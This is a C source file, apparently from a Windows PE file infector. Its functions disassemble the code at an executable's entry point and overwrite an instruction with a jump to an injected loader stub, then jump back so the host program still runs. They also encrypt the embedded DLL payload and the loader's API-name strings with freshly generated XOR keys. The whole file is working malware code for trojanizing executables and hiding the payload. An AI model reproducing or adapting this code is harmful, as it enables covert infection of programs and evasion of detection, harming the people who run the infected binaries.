#include "compat.h"

#include "utils.h"
#include "patch.h"
#include "pe_infect.h"
#include "log.h"
#include "loader.h"
#include "crypt.h"

#include "distorm/distorm.h"
#include "distorm/mnemonics.h"
#include "disasm.h"


void patchRelJMP(BYTE* buf, DWORD destVA)
{
    *(buf) = 0xE9;
    DWORD dwVALittle = destVA;
    COMPAT(memcpy)(buf+1, &dwVALittle, 4);
}

BOOL bPatchLoader(const struct ParsedPE* ppe)
{
    /* Patch Loader Trailer */
    if (ppe->loader86->sizStack < ppe->hdrOptional->SizeOfStackCommit) {
        /* Loader should reserve at least SizeOfStackCommit bytes at startup. *
         * (Some WinAPI functions need this!) */
        ppe->loader86->sizStack += ppe->hdrOptional->SizeOfStackCommit;
    }
    ppe->loader86->ptrToDLL  = PtrToRva(ppe, ppe->ptrToDLL);
    ppe->loader86->sizOfDLL  = ppe->sizOfDLL;
    const struct loader_x86_data* orig_ldr = getOrigLoader();
    if (orig_ldr) {
        if (ppe->hasLdr) {
            /* generate xor key/iv */
            struct loader_x86_data* ldr = ppe->loader86;
            for (unsigned i = 0; i < LOADER_IVKEYLEN; ++i) {
                while (ldr->key[i] == 0) ldr->key[i] = xor32_randomkey();
                while (ldr->iv[i] == 0) ldr->iv[i] = xor32_randomkey();
            }
            /* encrypt loader strings */
            size_t newsiz = xor32n_pcbc_crypt_buf((uint32_t*)&ldr->strVirtualAlloc[0], (sizeof(ldr->strVirtualAlloc)/sizeof(ldr->strVirtualAlloc[0])) - sizeof(ldr->strVirtualAlloc[0]), &ldr->iv[0], &ldr->key[0], LOADER_STR_IVKEYLEN);
            if (newsiz != (sizeof(ldr->strVirtualAlloc)/sizeof(ldr->strVirtualAlloc[0])) - sizeof(ldr->strVirtualAlloc[0])) {
                LOG_MARKER;
            }
            newsiz = xor32n_pcbc_crypt_buf((uint32_t*)&ldr->strIsBadReadPtr[0], (sizeof(ldr->strIsBadReadPtr)/sizeof(ldr->strIsBadReadPtr[0])) - sizeof(ldr->strIsBadReadPtr[0]), &ldr->iv[0], &ldr->key[0], LOADER_STR_IVKEYLEN);
            if (newsiz != (sizeof(ldr->strIsBadReadPtr)/sizeof(ldr->strIsBadReadPtr[0])) - sizeof(ldr->strIsBadReadPtr[0])) {
                LOG_MARKER;
            }
            /* check if DLL section in current process image is encrypted */
            struct ParsedPE* dllpe = COMPAT(calloc)(1, sizeof(struct ParsedPE));
            if (!bParsePE(ppe->ptrToDLL, ppe->sizOfDLL, dllpe, TRUE)) {
                /* assume encrypted dll, decrypt it now */
                const struct loader_x86_data* orig_ldr = getOrigLoader();
                if (!orig_ldr) {
                    LOG_MARKER;
                    return FALSE;
                }
                newsiz = xor32n_pcbc_crypt_buf((uint32_t*)ppe->ptrToDLL, ppe->sizOfDLL, &orig_ldr->iv[0], &orig_ldr->key[0], LOADER_IVKEYLEN);
                if (newsiz != ppe->sizOfDLL) {
                    LOG_MARKER;
                }
                /* if PE-Header is still invalid, an unknown error occurred */
                if (!bParsePE(ppe->ptrToDLL, ppe->sizOfDLL, dllpe, TRUE)) {
                    LOG_MARKER;
                    COMPAT(free)(dllpe);
                    return FALSE;
                }
            }
            COMPAT(free)(dllpe);
            /* encrypt DLL section */
            if (ppe->hasDLL) {
                newsiz = xor32n_pcbc_crypt_buf((uint32_t*)ppe->ptrToDLL, ppe->sizOfDLL, &ldr->iv[0], &ldr->key[0], LOADER_IVKEYLEN);
                if (newsiz != ldr->sizOfDLL) {
                    LOG_MARKER;
                    return FALSE;
                }
            } else {
                LOG_MARKER;
                return FALSE;
            }
        } else {
            LOG_MARKER;
            return FALSE;
        }
    } else {
        LOG_MARKER;
        return FALSE;
    }
#ifdef _PRE_RELEASE
    if (ppe->hasLdr) {
        COMPAT(puts)("LdrXorKey: ");
        __printByteBuf((unsigned char*)&ppe->loader86->key[0], sizeof(ppe->loader86->key));
        COMPAT(puts)("LdrXorIV: ");
        __printByteBuf((unsigned char*)&ppe->loader86->iv[0], sizeof(ppe->loader86->iv));
        COMPAT(puts)("LdrStrVA: ");
        __printByteBuf((unsigned char*)&ppe->loader86->strVirtualAlloc[0], sizeof(ppe->loader86->strVirtualAlloc));
        COMPAT(puts)("LdrStrIBRP: ");
        __printByteBuf((unsigned char*)&ppe->loader86->strIsBadReadPtr[0], sizeof(ppe->loader86->strVirtualAlloc));
    }
    COMPAT(printf)("LdrTrl: %p (%X)\n", PtrToOffset(ppe, (BYTE*)ppe->loader86), PtrToOffset(ppe, (BYTE*)ppe->loader86));
    COMPAT(printf)("LdrSig: %p , %p , %p\n", ppe->loader86->ptrToDLL, ppe->loader86->sizOfDLL, SWAP_ENDIANESS32(ppe->loader86->endMarker));
    __printByteBuf(ppe->ptrToLdr, getRealLoaderSize());
#endif
    return TRUE;
}

BOOL bPatchNearEntry(const struct ParsedPE* ppe)
{
    if (!ppe || !ppe->valid) return FALSE;

    DWORD dwEntryRVA = ppe->hdrOptional->AddressOfEntryPoint;
    BYTE* pEntry = RvaToPtr(ppe, dwEntryRVA);
    SIZE_T maxInstructions = 100;
    _DecodeResult res;
    _OffsetType offset = 0;
    _DecodeType dt = Decode32Bits;
    unsigned int decodedInstructionsCount = 0;

    unsigned long long int bytesproc = 0, maxbytesproc = 100;
    unsigned long long int filesize = 0;
    const unsigned char* entry = (const unsigned char*)pEntry;
    unsigned int next;

#ifdef _PRE_RELEASE
    COMPAT(printf)("AddressOfEntry...: 0x%p\n", dwEntryRVA);
#endif
    while (1) {
        _DInst instData[maxInstructions];
        res = disasm(offset, entry, ppe->bufSiz, dt, instData, maxInstructions, &decodedInstructionsCount);

        for (unsigned int i = 0; i < decodedInstructionsCount; i++) {
            bool isRelativeJmpCall = false;
            _InstructionType optype = instData[i].opcode;
            switch (optype) {
                case I_JMP:
                case I_CALL:
                    isRelativeJmpCall = true;
                    break;
            }
#ifdef _PRE_RELEASE
            switch (optype) {
                case I_DEC:      COMPAT(puts)("\tDEC"); break;
                case I_INC:      COMPAT(puts)("\tINC"); break;
                case I_ADD:      COMPAT(puts)("\tADD"); break;
                case I_SUB:      COMPAT(puts)("\tSUB"); break;
                case I_MOV:      COMPAT(puts)("\tMOV"); break;
                case I_PUSH:     COMPAT(puts)("\tPUSH"); break;
                case I_POP:      COMPAT(puts)("\tPOP"); break;
                case I_NOP:      COMPAT(puts)("\tNOP"); break;
                case I_JMP:      COMPAT(puts)("\tJMP"); break;
                case I_JMP_FAR:  COMPAT(puts)("\tJMP FAR"); break;
                case I_CALL:     COMPAT(puts)("\tCALL"); break;
                case I_CALL_FAR: COMPAT(puts)("\tCALL FAR"); break;
                case I_TEST:     COMPAT(puts)("\tTEST"); break;
                case I_CMP:      COMPAT(puts)("\tCMP"); break;
                case I_RET:      COMPAT(puts)("\tRET"); break;
            }
            if (isRelativeJmpCall)
                COMPAT(puts)(" REL");
            COMPAT(printf)("\t%u\t%u\n", (unsigned int)instData[i].size, (unsigned int)instData[i].addr);
#endif
            if (instData[i].size >= 5 && instData[i].size <= 10) {
                size_t szOffEntry = PtrToOffset(ppe, (BYTE*)entry+bytesproc);
#ifdef _PRE_RELEASE
                COMPAT(printf)("Found a patchable instruction at 0x%X\n", instData[i].addr);
                COMPAT(printf)("\tPE-Ptr: %p\n", ppe->ptrToBuf);
                COMPAT(printf)("\tE-Off.: %p\n", szOffEntry);
                COMPAT(printf)("\tE-RVA.: %p\n", PtrToRva(ppe, (BYTE*)entry));
                COMPAT(printf)("\tE-Size: %p\n", instData[i].size);
                COMPAT(printf)("\tE-Disp: %p (Size: %p)\n", instData[i].disp, instData[i].dispSize);
                COMPAT(printf)("\tE-Inst: ");
                __printByteBuf(ppe->ptrToBuf+szOffEntry, 0x10);
                if (ppe->hasLdr == TRUE) {
                    size_t szOffLdr = PtrToOffset(ppe, ppe->ptrToLdr);
                    COMPAT(printf)("\tLdrRVA: %p (%X)\n", OffsetToRva(ppe, szOffLdr), szOffLdr);
                    COMPAT(printf)("\tLdr...: ");
                    __printByteBuf(ppe->ptrToLdr, 0x10);
                }
#endif
                DWORD dwOffNop = -1;
                if (ppe->hasLdr) {
                    dwOffNop = offFindNopsled(ppe->ptrToLdr, ppe->sizOfLdr, instData[i].size + SIZEOF_X86_JMP32);
                }
                if (ppe->hasDLL && ppe->hasLdr) {
                    /* Patch Loader + PE Exe */
                    COMPAT(memcpy)(ppe->ptrToLdr+dwOffNop, ppe->ptrToBuf+szOffEntry, instData[i].size); // copy replaced orig op to ldr stub
                    /* ReCalculate address of orig op if relative. */
                    if (isRelativeJmpCall) {
                        DWORD tmpAdr = szOffEntry + INSTRUCTION_GET_TARGET(&instData[i]);
#ifdef _PRE_RELEASE
                        COMPAT(printf)("RelAdr: %p (%u)\n", instData[i].imm.addr, tmpAdr);
                        COMPAT(printf)("RelPtr: %p - %p\n", PtrToRva(ppe, ppe->ptrToBuf + tmpAdr), PtrToRva(ppe, ppe->ptrToLdr + dwOffNop));
#endif
                        DWORD relAdr = PtrToRva(ppe, ppe->ptrToBuf + tmpAdr) - PtrToRva(ppe, ppe->ptrToLdr + dwOffNop) - instData[i].size;
                        *(DWORD*)(ppe->ptrToLdr + dwOffNop + FLAG_GET_OPSIZE(instData[i].flags)) = relAdr;
                    }
                    offFillNops(ppe->ptrToBuf+szOffEntry, instData[i].size); // fill orig op with nops
                    patchRelJMP(ppe->ptrToBuf+szOffEntry, PtrToRva(ppe, ppe->ptrToLdr)-PtrToRva(ppe, ppe->ptrToBuf+szOffEntry + SIZEOF_X86_JMP32)); // patch jump from orig exe to ldr
                    DWORD origJMPVA = PtrToRva(ppe, ppe->ptrToLdr+dwOffNop+instData[i].size)-PtrToRva(ppe, ppe->ptrToBuf+szOffEntry)-1;
                    patchRelJMP(ppe->ptrToLdr+dwOffNop+instData[i].size, (-1)-origJMPVA); // patch jump back from loader to orig exe
#ifdef _PRE_RELEASE
                    COMPAT(printf)("LdrNop: Offset: %d (Size: %u)\n", dwOffNop, instData[i].size + SIZEOF_X86_JMP32);
                    COMPAT(printf)("LdrJMP: %p -> %p (%X)\n", PtrToRva(ppe, ppe->ptrToLdr+dwOffNop+instData[i].size), PtrToRva(ppe, ppe->ptrToBuf+szOffEntry), origJMPVA);
#endif
                    if (!bPatchLoader(ppe)) {
                        LOG_MARKER;
                    }
                }
                res = DECRES_SUCCESS;
                break;
            }

            bytesproc += instData[i].size;
            if (bytesproc >= maxbytesproc) break;
        }

        if (res == DECRES_SUCCESS) break;
        else if (decodedInstructionsCount == 0) break;
        if (bytesproc >= maxbytesproc) break;
        next = (unsigned int)(instData[decodedInstructionsCount-1].addr - offset);
        next += instData[decodedInstructionsCount-1].size;
        entry += next;
        filesize -= next;
        offset += next;
    }
    return TRUE;
}

int offFindNopsled(const BYTE* buf, SIZE_T szBuf, SIZE_T szNopsled)
{
    SIZE_T szCurNopsled = 0;
    for (SIZE_T i = 0; i < szBuf; ++i) {
        if (buf[i] == 0x90) {
            if (++szCurNopsled == szNopsled)
                return (int)(&buf[i]-buf-szCurNopsled+1);
        } else szCurNopsled = 0;
    }
    return -1;
}

void offFillNops(BYTE* buf, SIZE_T szFill)
{
    BYTE tmpfill[szFill];
    COMPAT(memset)(&tmpfill[0], 0x90, szFill);
    COMPAT(memcpy)(buf, &tmpfill[0], szFill);
}
